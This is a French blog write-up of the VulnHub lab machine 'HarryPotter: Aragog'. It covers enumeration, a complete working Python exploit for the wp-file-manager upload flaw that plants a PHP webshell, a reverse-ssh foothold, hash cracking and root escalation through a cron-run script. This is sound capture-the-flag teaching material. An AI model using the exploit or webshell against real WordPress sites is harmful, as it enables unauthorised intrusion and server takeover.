# Solution du CTF HarryPotter: Aragog de VulnHub

Intro
-----

Sur VulnHub on trouve tout un tas de CTFs. Certains bien réalisés et pour d'autres on a du mal à croire que leurs auteurs aient seulement testé leur VM avant de la soumettre.  

Les VM que je qualifierais de mauvaises sont le plus souvent celles qui nécessitent une énumération pour trouver un dossier sur un serveur web mais le dossier en question a un nom improbable qui n'est bien évidemment présent dans aucune wordlist standard (après plusieurs heures à laisser tourner un dirbuster quelconque il est généralement le temps d'abandonner).  

C'est donc après avoir jeté plusieurs VMs de ce style que je suis finalement tombé sur le CTF [HarryPotter: Aragog](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/) qui, heureusement ,ne fait pas partie de cette catégorie, même si j'ai eu quelques problèmes à l'énumération comme vous le verrez par la suite.  

Cette VM a été créé par [Mansoor R](https://twitter.com/@time4ster) (merci à lui) et fait partie d'une série :  

> Aragog is the 1st VM of 3-box HarryPotter VM series in which you need to find 2 horcruxes hidden inside the machine  
> 
>  (total 8 horcruxes hidden across 3 VMs of the HarryPotter Series) and ultimately defeat Voldemort.

Comme on veut tous casser la gueule de cette face de rat de *Voldemort*, trêve de bavardage, j'ai mon clavier magique qui est prêt.  

Wordpress troué
---------------

Evidemment il y a un port 80 découvert via Nmap  

```plain
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.46 (Debian)
```

évidemment il y a un blog après une énumération avec *Feroxbuster*  

```plain
301        9l       28w      311c http://192.168.2.13/blog
```

évidemment il y a un utilisateur enregistré sur ce blog (*wp-admin*) que l'on aura remarqué via les posts ou un outil comme wpscan.  

Cet utilisateur indique dans un de ses posts l'information suivante :  

> We will be deleting some of our unused wordpress plugins in future as security best practices.

Intéressant. Sauf que là plus rien : [WPScan](https://wpscan.com/wordpress-security-scanner) ne voit que le plugin *Akismet* qui n'a pas de vulnérabilités sérieuses... Étrange, le fonctionnement de *wpscan* étant pourtant de réaliser par défaut une énumération exhaustive des plugins.  

J'ai dégainé ce valeureux Wapiti et son module *wp\_enum*... Et vous savez quoi ?  

```plain
[*] Lancement du module wp_enum
Enumération des extensions WordPress :
wp-file-manager 6.0 détecté
----
Enumération des thèmes WordPress :
twentynineteen 1.2 détecté
```

Je ne sais pas si c'est le fait que *wpscan* tournait dans son image Docker mais il faut toujours de méfier des outils qu'on emploie quitte à en tester plusieurs (j'ai déjà eu des situations similaires avec des outils de bruteforce réseau comme Hydra/Ncrack/Medusa).  

On trouve sur exploit-db un exploit bash pour cette vulnérabilité. Mais j'ai une préférence pour Python alors je suis allé fouiller sur Github et le code n'est pas toujours beau à voir.  

Je me suis basé sur [cet exploit](https://github.com/kalidor/wp-file-manager_6.8) qui a le mérite d'utiliser Python 3 et je l'ai réécrit en mieux (c'est un avis personnel bien sûr mais ça réduit tout de même de 35 lignes pour faire la même chose avec des erreurs en moins) :  

```python
#!/usr/bin/env python3
import sys
from urllib.parse import urlparse
from string import ascii_lowercase
from random import choices
from pathlib import Path
from typing import Optional

import requests

def get_root_url(url: str) -> str:
    parts = urlparse(url)
    return f"{parts.scheme}://{parts.netloc}/"

def get_random_php_filename() -> str:
    return "".join(choices(ascii_lowercase, k=10)) + ".php"

def attack(url, filename: Optional[str] = None):
    sess = requests.Session()
    sess.verify = False
    if filename:
        payload = open(filename, "rb").read()
    else:
        payload = b"<pre><?php system($_GET['cmd']); ?></pre>"

    backdoor_filename = get_random_php_filename()
    response = sess.post(
        f"{url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        files={
            "upload[]": (backdoor_filename, payload, "image/png"),
            "target": (None, "l1_Lw"),
            "cmd": (None, "upload")
        }
    )
    if response.status_code == 200:
        data = response.json()
        if len(data["added"]) > 0:
            shell_url = get_root_url(url) + str(Path(data['added'][0]['url']).resolve()).lstrip("/")
            print(f"Success! Get your shell here: {shell_url}")
        else:
            print(f"Failure! {data}")
    else:
        print(f"Error: Server replied with HTTP {response.status_code}")

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} http://target/path_to_wordpress/ [optional_php_shell_filename]")
    print("Default shell just call system($_GET['cmd'])")
    sys.exit()

attack(sys.argv[1], None if len(sys.argv) < 3 else sys.argv[2])
```

Sur le blog on remarque le nom d'hôte *wordpress.aragog.hogwarts* que j'ai ajouté à mon */etc/hosts* au cas où.  

L'exploit s'utilise de cette manière :   

```bash
$ python exploit.py http://wordpress.aragog.hogwarts/blog/
```

Par défaut il exploite la vulnérabilité pour uploader un bête webshell qui prend la commande à exécuter dans le paramètre *cmd*. Mais on peut rajouter comme second argument un nom de fichier à uploader à la place, ce qui est bien pratique pour rapatrier des outils supplémentaires :)  

Sans trop de surprise on a les droits de l'user web :  

```plain
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le Wordpress est installé dans */usr/share/wordpress/* ce qui me semble moins banal mais l'explication est qu'il a été installé via un paquet de la distribution (*Debian Buster 10*).  

Ainsi on retrouve le fichier de configuration dans */etc/wordpress/config-default.php* avec les accès à la base de données :  

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
```

Mon royaume pour un shell
-------------------------

Je relève deux utilisateurs sur le système :  

```plain
uid=1001(ginny) gid=1001(ginny) groups=1001(ginny)
uid=1000(hagrid98) gid=1000(hagrid98) groups=1000(hagrid98)
```

Le premier n'a aucun fichier d'intéressant sur le système. Le second a en revanche un horcrux (les flags du challenge) qui est world-readable :  

```plain
-rw-r--r-- 1 hagrid98 hagrid98   91 Apr  1  2021 horcrux1.txt
```

Le contenu est le suivant :  

```plain
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
```

dont une partie de décode en base64 comme 
> 1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets

Bon, à un moment il faut quitter le webshell et passer à quelque chose de beau avec un PTY.  

A une époque j'utilise le fabuleux [Tiny Shell (tsh)](https://github.com/creaktive/tsh) mais il existe plusieurs projets similaires et à jour. J'ai jeté mon dévolu sur [reverse-ssh](https://github.com/Fahrj/reverse-ssh) qui est tout autant fantastique :  

* Communications chiffrées
* Terminal (support PTY)
* Transfert de fichier

On peut faire forwarder des ports car le programme est en fait un serveur SSH écrit en Go et compilé statiquement (le projet propose des releases). Cerise sur le gâteau comme son nom l'indique on peut avoir des reverse shells.  

Je l'ai lancé depuis la VM sans argument (*./myssh*). Et j'ai utilisé la commande suivante pour m'y connecter (avec le client SSH standard) :  

```plain
$ ssh -oHostKeyAlgorithms=ssh-rsa -p 31337 wordpress.aragog.hogwarts
The authenticity of host '[wordpress.aragog.hogwarts]:31337 ([192.168.2.13]:31337)' can't be established.
RSA key fingerprint is SHA256:QwzZMdzodLOJ1mnDdK3UfWjrpeHqDaD2vSsvfP9+6+s.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[wordpress.aragog.hogwarts]:31337' (RSA) to the list of known hosts.
devloop@wordpress.aragog.hogwarts's password: 
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$
```

La release fonctionne via un mot de passe hardcodé (*letmeinbrudipls*). Le nom d'utilisateur spécifié n'a pas d'importance.  

Way to root
-----------

La box ne dispose pas du sudo. Je dois dire que ça fait tout drôle :D   

J'ai lancé *LinEnum* qui n'a rien trouvé d'intéressant. Les permissions sur les fichiers, les serveurs en écoute, les process en cours, les exécutables setuid, la crontab... Rien d'anormal.  

Il ne me reste qu'à fouiller dans la base de données MySQL :  

```plain
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
```

Voilà qui est mieux. Ça se casse en moins de deux avec JtR :  

```plain
$ ./john --format=phpass --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Je switche sur l'utilisateur *hagrid98* via la commande *su*. En cherchant les fichiers de cet utilisateur sur le système j'ai trouvé */opt/.backup.sh*.  

Ce script semble destiné à effectuer une backup des fichiers web (une simple commande *cp*) mais comment ce script se lance sans sudo ni sans entrée dans la crontab ?  

J'ai finalement eu recours à [pspy](https://github.com/DominicBreuker/pspy) pour monitorer les processus sur le système.  

L'utilisateur root doit avoir une entrée dans sa crontab :  

```plain
2021/11/25 20:48:01 CMD: UID=0    PID=3736   | /usr/sbin/CRON -f 
2021/11/25 20:48:01 CMD: UID=0    PID=3737   | /usr/sbin/CRON -f 
2021/11/25 20:48:01 CMD: UID=0    PID=3738   | /bin/sh -c bash -c "/opt/.backup.sh" 
2021/11/25 20:48:01 CMD: UID=0    PID=3739   | /bin/bash /opt/.backup.sh 
```

Avec cette info il n'y a plus qu'à éditer le script pour lui faire ajouter ma clé publique SSH dans le fichier *authorized\_keys* de root. On attend un peu et on se connecte :  

```plain
ssh root@192.168.2.13
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@Aragog:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Aragog:~# ls
horcrux2.txt
root@Aragog:~# cat horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   

Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
```

En espérant que les autres épisodes soient aussi bien réalisés :)

*Published November 25 2021 at 18:34*